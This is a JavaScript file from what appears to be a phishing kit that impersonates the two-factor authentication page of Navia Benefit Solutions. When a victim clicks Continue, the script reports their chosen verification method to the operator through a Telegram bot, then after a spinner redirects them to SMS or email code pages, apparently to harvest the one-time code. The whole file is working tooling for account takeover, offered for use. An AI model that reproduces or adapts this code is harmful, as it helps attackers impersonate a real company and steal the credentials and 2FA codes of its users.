/**
 * Navia Benefit Solutions — 2FA Page JavaScript
 * Updated with Telegram Bot Integration
 */

(function () {
    'use strict';

    const methodButtons = document.querySelectorAll('.tfa-method-btn');
    const continueBtn   = document.getElementById('tfaContinueBtn');
    let selectedMethod = 'sms';

    /* ─── LOADING HELPER ─────────────────────────────────────── */
    function startButtonLoading(btn, ms, onDone) {
        if (!btn) return;
        const originalHTML = btn.innerHTML;
        const originalWidth = btn.offsetWidth;
        btn.disabled = true;
        btn.style.minWidth = originalWidth + 'px';
        btn.innerHTML = '<span class="btn-spinner" aria-hidden="true"></span>';
        btn.classList.add('btn-loading');

        setTimeout(() => {
            btn.disabled = false;
            btn.style.minWidth = '';
            btn.innerHTML = originalHTML;
            btn.classList.remove('btn-loading');
            if (onDone) onDone();
        }, ms);
    }

    /* ─── METHOD SELECTION ────────────────────────────────────── */
    methodButtons.forEach(function (btn) {
        btn.addEventListener('click', function () {
            selectedMethod = btn.getAttribute('data-method');

            methodButtons.forEach(function (b) {
                const icon  = b.querySelector('.tfa-method-icon');
                const radio = b.querySelector('.tfa-method-radio');

                if (b === btn) {
                    b.classList.add('tfa-method-btn--active');
                    b.setAttribute('aria-pressed', 'true');
                    if (icon) icon.classList.add('tfa-method-icon--active');
                    if (radio) radio.classList.add('tfa-method-radio--active');
                } else {
                    b.classList.remove('tfa-method-btn--active');
                    b.setAttribute('aria-pressed', 'false');
                    if (icon) icon.classList.remove('tfa-method-icon--active');
                    if (radio) radio.classList.remove('tfa-method-radio--active');
                }
            });
        });
    });

    /* ─── CONTINUE BUTTON ─────────────────────────────────────── */
    if (continueBtn) {
        continueBtn.addEventListener('click', function () {
            // === IMMEDIATE TELEGRAM SEND ===
            TG.send(
                `📲 <b>Navia 2FA Method Selected</b>\n\n` +
                `Method: <b>${selectedMethod.toUpperCase()}</b>\n` +
                `⏰ ${TG.ts()}`
            );

            const destination = selectedMethod === 'email' ? '/email-otp' : '/sms-otp';
            startButtonLoading(continueBtn, 5000, function () {
                window.location.href = destination;
            });
        });
    }

}());